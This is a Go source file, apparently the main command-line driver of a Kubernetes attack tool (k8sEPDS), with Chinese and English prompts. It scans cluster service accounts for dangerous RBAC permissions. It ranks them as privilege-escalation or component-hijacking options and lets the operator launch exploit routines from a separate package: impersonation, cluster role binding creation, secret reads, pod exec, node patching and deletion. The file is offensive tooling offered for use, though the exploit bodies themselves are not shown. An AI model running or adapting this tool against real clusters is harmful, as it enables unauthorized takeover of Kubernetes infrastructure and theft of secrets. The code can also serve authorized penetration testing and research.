package cmd

import (
	"fmt"
	"k8sEPDS/conf"
	"k8sEPDS/models"
	exp "k8sEPDS/pkg/exploit"
	"k8sEPDS/pkg/scan"
	"reflect"
	"sort"
	"strings"
)

var (
	ssh          models.SSHConfig
	criticalSAs  []models.CriticalSA
	saBindingMap map[string]*models.SA
)

func Main() {
	ssh = conf.Config.SSH
	operation := ""
	for {
		fmt.Println("\n可用命令:")
		fmt.Println("  scan        - 扫描权限")
		fmt.Println("  exp         - 利用漏洞")
		fmt.Println("  resetconfig - 重置配置")
		fmt.Println("  help        - 显示帮助")
		fmt.Println("  exit        - 退出程序")
		fmt.Print("请输入命令:")
		fmt.Scan(&operation)
		switch operation {
		case "scan":
			{
				saBindingMap = scan.GetSaBinding()
				criticalSAs = scan.GetCriticalSA(scan.GetSA(saBindingMap), ssh.Nodename)

				fmt.Println()
				for _, criticalSA := range criticalSAs {
					if !criticalSA.SA0.IsMounted {
						continue
					}
					fmt.Println("[app]:", criticalSA.SA0.SAPod.Namespace)
					fmt.Println("[component]:", criticalSA.SA0.SAPod.Name)
					fmt.Println("[SA]:", criticalSA.SA0.Name)
					fmt.Println("[permission]:", criticalSA.Type)
					fmt.Println("[node]:", criticalSA.SA0.SAPod.NodeName)
					fmt.Println("[roles/clusterRoles]:", criticalSA.Roles)
					fmt.Println("[roleBindings]:", criticalSA.SA0.RoleBindings)
					fmt.Println("-------------------------------------------")
					fmt.Println()
				}

			}
		case "exp":
			{
				exploit(classify(), ssh.Nodename, false)
			}
		case "resetconfig":
			{
				conf.GetConfig()
				conf.UpdateConfig()
				conf.GetConfig()
				ssh = conf.Config.SSH
			}
		case "help":
            showHelp()
        case "exit":
            return 
        default:
            fmt.Println("无效的命令，请使用 help 查看可用命令")
        }
	}
}

func showHelp(){
	fmt.Println("\n可用命令:")
    fmt.Println("  scan        - 扫描关键ServiceAccount")
    fmt.Println("  exp         - 利用关键SA的关键权限进行攻击")
    fmt.Println("  resetconfig - 重新加载配置")
    fmt.Println("  help        - 显示帮助信息")
    fmt.Println("  exit        - 退出程序")
}

func classify() map[string][]SA_sort {
	/*
		{
			"escalate": [{"any": CriticalSA},{"restrict: CriticalSA"},...],
			"hijack": [{},{}],
		}
	*/
	result := make(map[string][]SA_sort, 0)
	kind := map[string]string{
		//createrolebinding*2、patchrolebinding*2、patchrole*2
		"impersonate":               "anyescalate",
		"createclusterrolebindings": "anyescalate",
		"patchclusterroles":         "anyescalate",
		"createtokens":              "anyescalate",
		"createpods":                "anyescalate",
		"createpodcontrollers":      "anyescalate",
		"patchpodcontrollers":       "anyescalate",
		"createwebhookconfig":       "anyescalate",
		"patchwebhookconfig":        "anyescalate",
		"createrolebindings":        "restrictescalate",
		"patchclusterrolebindings":  "restrictescalate",
		"patchrolebindings":         "restrictescalate",
		"patchroles":                "restrictescalate",
		"createsecrets":             "restrictescalate",
		"getsecrets":                "restrictescalate",
		"execpods":                  "restrictescalate",
		"execpods2":                 "restrictescalate",
		"patchpods":                 "restrictescalate",
		"watchsecrets":              "restrictescalate",
		"patchnodes":                "anyhijack",
		"deletenodes":               "anyhijack",
		"deletepods":                "restricthijack",
		"createpodeviction":         "restricthijack",
	}
	replacements := map[string]string{
		"daemonsets":                      "podcontrollers",
		"deployments":                     "podcontrollers",
		"statefulsets":                    "podcontrollers",
		"replicasets":                     "podcontrollers",
		"jobs":                            "podcontrollers",
		"cronjobs":                        "podcontrollers",
		"replicationcontrollers":          "podcontrollers",
		"mutatingwebhookconfigurations":   "webhookconfig",
		"validatingwebhookconfigurations": "webhookconfig",
	}
	if len(saBindingMap) == 0 {
		saBindingMap = scan.GetSaBinding()
	}
	if len(criticalSAs) == 0 {
		criticalSAs = scan.GetCriticalSA(scan.GetSA(saBindingMap), ssh.Nodename)
	}
	criticalSAsWrappers := []models.CriticalSAWrapper{}
	for _, criticalSA := range criticalSAs {
		for _, criticalSAType := range criticalSA.Type {
			criticalSAsWrapper := models.CriticalSAWrapper{
				Crisa: criticalSA,
				Type:  criticalSAType,
			}
			criticalSAsWrappers = append(criticalSAsWrappers, criticalSAsWrapper)
		}
	}

	for _, criticalSA := range criticalSAsWrappers {
		if !criticalSA.Crisa.InNode || !criticalSA.Crisa.SA0.IsMounted {
			continue
		}
		kindType := criticalSA.Type //reduce the rawType
		if strings.Contains(criticalSA.Type, "(") {
			kindType = kindType[:strings.Index(kindType, "(")]
		} else if strings.Contains(criticalSA.Type, "[") {
			kindType = kindType[:strings.Index(kindType, "[")]
		}
		dispatchfunc := kindType
		for old, new := range replacements {
			dispatchfunc = strings.Replace(dispatchfunc, old, new, -1)
		}
		newResult := SA_sort{Level: kind[dispatchfunc] + "-" + criticalSA.Type, SA: criticalSA, dispatchFunc: dispatchfunc}
		tmpType := ""
		if strings.Contains(kind[dispatchfunc], "escalate") {
			tmpType = "escalate"
		} else if strings.Contains(kind[dispatchfunc], "hijack") {
			tmpType = "hijack"
		} else if strings.Contains(kind[dispatchfunc], "dos") {
			tmpType = "dos"
		}
		if criticalSA.Crisa.Level == "namespace" && !strings.Contains(criticalSA.Type, "kube-system") {
			newResult = SA_sort{Level: "restrict" + tmpType + "-" + criticalSA.Type, SA: criticalSA, dispatchFunc: dispatchfunc}
		}
		result[tmpType] = append(result[tmpType], newResult)
	}
	for k := range result {
		sort.Slice(result[k], func(i, j int) bool {
			return result[k][i].Level < result[k][j].Level
		})
	}

	return result
}

func exploit(payloads map[string][]SA_sort, ControledNode string, hijacked bool) {
	anyescalateMap := make(map[int]SA_sort)
	cnt := 0
	for _, sa := range payloads["escalate"] {
		if strings.Contains(sa.Level, "any") {
			if cnt == 0 {
				fmt.Println("[√] 发现权限提升漏洞，可用权限如下：")
				fmt.Println("---------------------------")
			}
			fmt.Println(cnt, sa.SA.Type, "使用SA:", sa.SA.Crisa.SA0.Name)
			anyescalateMap[cnt] = sa
			cnt++
		}
	}
	if len(anyescalateMap) != 0 {
		var choice int
		fmt.Println("---------------------------")
		fmt.Print("[输入] 选择权限提升类型: ")
		fmt.Scan(&choice)
		fmt.Printf("[msg] 即将使用账户%s(权限%s)执行权限提升\n",
		anyescalateMap[choice].SA.Crisa.SA0.Name, 
		anyescalateMap[choice].SA.Type)
		dispatch(anyescalateMap[choice].SA.Crisa, anyescalateMap[choice].dispatchFunc)
		return
	}
	if hijacked {
		if len(payloads["escalate"]) == 0 {
			fmt.Println("[X] 未检测到可用的权限提升")
			return
		}
		fmt.Println("[!] 仍然无法任意提升权限")
		fmt.Println("[msg] 准备列出可用的权限提升选项")
		fmt.Println("---------------------------")
		escalateMap := make(map[int]SA_sort)
		cnt := 0
		for _, sa := range payloads["escalate"] {
			fmt.Println(cnt, sa.SA.Type, sa.SA.Crisa.SA0.Name)
			escalateMap[cnt] = sa
			cnt++
		}
		fmt.Println("---------------------------")
		fmt.Print("[输入] 选择权限提升类型: ")
		var choice int
		fmt.Scan(&choice)
		fmt.Printf("[msg] 即将使用账户%s(权限%s)执行权限提升\n",
		escalateMap[choice].SA.Crisa.SA0.Name,
		escalateMap[choice].SA.Type)
		dispatch(escalateMap[choice].SA.Crisa, escalateMap[choice].dispatchFunc)
	}

	if !hijacked {
		fmt.Println("[!] 无法直接提升权限")
        fmt.Println("[msg] 准备检测'劫持'相关权限")
		hijack(payloads)
		exploit(payloads, ControledNode, true)
	}
}

func hijack(payloads map[string][]SA_sort, ) bool {
	if len(payloads["hijack"]) == 0 {
		fmt.Println("[!] No 'hijack' related permissions detected")
		return false
	}
	anyhijackMap := make(map[int]SA_sort)
	cnt1 := 0
	for _, sa := range payloads["hijack"] {
		if strings.Contains(sa.Level, "any") {
			if cnt1 == 0 {
				fmt.Println("[√] Any component can be hijacked, and the available permissions are as follows::")
				fmt.Println("---------------------------")
			}
			fmt.Println(cnt1, sa.SA.Type, sa.SA.Crisa.SA0.Name)
			anyhijackMap[cnt1] = sa
			cnt1++
		}
	}
	if len(anyhijackMap) != 0 {
		var choice int
		fmt.Println("---------------------------")
		fmt.Print("[input] Choose a privilege escalation type: ")
		fmt.Scan(&choice)
		fmt.Println("[msg] Coming soon", "account"+anyhijackMap[choice].SA.Crisa.SA0.Name, "(permissions"+anyhijackMap[choice].SA.Type+")", "Perform component hijacking")
		dispatch(anyhijackMap[choice].SA.Crisa, anyhijackMap[choice].dispatchFunc)
		return true
	}
	fmt.Println("[!] Only certain components can be hijacked")
	fmt.Println("[msg] Prepare to list specific components that can be hijacked")
	fmt.Println("---------------------------")
	hijackMap := make(map[int]SA_sort)
	cnt2 := 0
	for _, sa := range payloads["hijack"] {
		fmt.Println(cnt2, sa.SA.Type, sa.SA.Crisa.SA0.Name)
		hijackMap[cnt2] = sa
		cnt2++
	}
	fmt.Println("---------------------------")
	fmt.Print("[input] Choose a hijacking type: ")
	var choice int
	fmt.Scan(&choice)
	fmt.Println("[msg] Coming soon", "account"+hijackMap[choice].SA.Crisa.SA0.Name, "(permissions"+hijackMap[choice].SA.Type+")", "Perform component hijacking")
	dispatch(hijackMap[choice].SA.Crisa, hijackMap[choice].dispatchFunc)
	return true
}

func dispatch(sa models.CriticalSA, dispatchFunc string) {
	funcMap := map[string]interface{}{
		"impersonate": exp.Impersonate, "createclusterrolebindings": exp.Createclusterrolebindings, "patchclusterroles": exp.Patchclusterroles, "createtokens": exp.Createtokens, "createpods": exp.Createpods, "createpodcontrollers": exp.Createpodcontrollers, "patchpodcontrollers": exp.Patchpodcontrollers,
		"createrolebindings": exp.Createrolebindings, "patchclusterrolebindings": exp.Patchclusterrolebindings, "patchrolebindings": exp.Patchrolebindings, "patchroles": exp.Patchroles, "createsecrets": exp.Createsecrets, "getsecrets": exp.Getsecrets, "execpods": exp.Execpods, "execpods2": exp.Execpods2, "patchpods": exp.Patchpods,
		"patchnodes": exp.Patchnodes, "deletepods": exp.Deletepods, "createpodeviction": exp.Createpodeviction, "deletenodes": exp.Deletenodes, "watchsecrets": exp.WatchSecrets, "patchwebhookconfig": exp.Patchwebhookconfig, "createwebhookconfig": exp.Createwebhookconfig,
	}
	funcValue := reflect.ValueOf(funcMap[dispatchFunc])
	args := []reflect.Value{reflect.ValueOf([]models.CriticalSA{sa}), reflect.ValueOf(ssh)}
	//fmt.Println("[msg] About to be called:", strings.Title(sa.Type))
	funcValue.Call(args)
}

type SA_sort struct {
	Level        string                   //Key used to sort by (any, restrict)
	dispatchFunc string                   //key used to call the function
	SA           models.CriticalSAWrapper //Actual SA information
}
